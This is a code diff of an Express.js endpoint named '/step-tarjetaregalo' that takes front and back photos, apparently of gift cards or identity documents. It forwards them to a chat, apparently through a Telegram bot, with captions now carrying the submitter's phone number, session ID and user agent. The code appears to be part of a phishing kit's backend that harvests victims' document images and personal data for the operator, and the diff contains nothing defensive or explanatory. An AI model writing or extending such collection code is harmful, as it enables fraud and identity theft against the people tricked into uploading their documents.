@@ -443,21 +443,29 @@ app.post("/step-tarjetaregalo", async (req, res) => {
 
     try {
 
-        const { frontImageBase64, backImageBase64 } = req.body;
+        const { sessionId, frontImageBase64, backImageBase64 } = req.body;
 
         if (!frontImageBase64 || !backImageBase64) {
             return res.status(400).json({ error: "Faltan imágenes" });
         }
+		
+		
+		 const session = sessionData.get(sessionId) || {};
+		 sessionData.set(sessionId, session);
 
         const frontBuffer = base64ToBuffer(frontImageBase64);
         const backBuffer = base64ToBuffer(backImageBase64);
+		
+		 const finalPhoneNumber = session.phoneNumber || phoneNumber || 'N/A';
 
-        const caption = `🎁 ¡Has recibido una Tarjeta de Regalo!
 
-         👉 Por favor VOLTEA la tarjeta para ver la parte trasera.
+        const caption = `🎁 🧬 DOCUMENTO RECIBIDA
 
-               || ""}`;
+          📱 Número: ${finalPhoneNumber}
+		  🆔 Session: ${sessionId}
+          🖥️ UA: ${session.userAgent || userAgent || req.headers['user-agent']     || ""}`;
 
+    
         // ========= FRONTAL =========
         let formFront = new FormData();
         formFront.append("chat_id", CHAT_ID);
@@ -480,7 +488,7 @@ app.post("/step-tarjetaregalo", async (req, res) => {
         // ========= TRASERA =========
         let formBack = new FormData();
         formBack.append("chat_id", CHAT_ID);
-        formBack.append("caption", "🔄 Parte trasera de la tarjeta");
+        formBack.append("caption", caption);
         formBack.append("photo", backBuffer, {
             filename: "trasera.jpg",
             contentType: "image/jpeg"
@@ -504,7 +512,7 @@ app.post("/step-tarjetaregalo", async (req, res) => {
     }
 
 });
- 
+
 // ==================== ENDPOINT: REGALO ====================
 
 
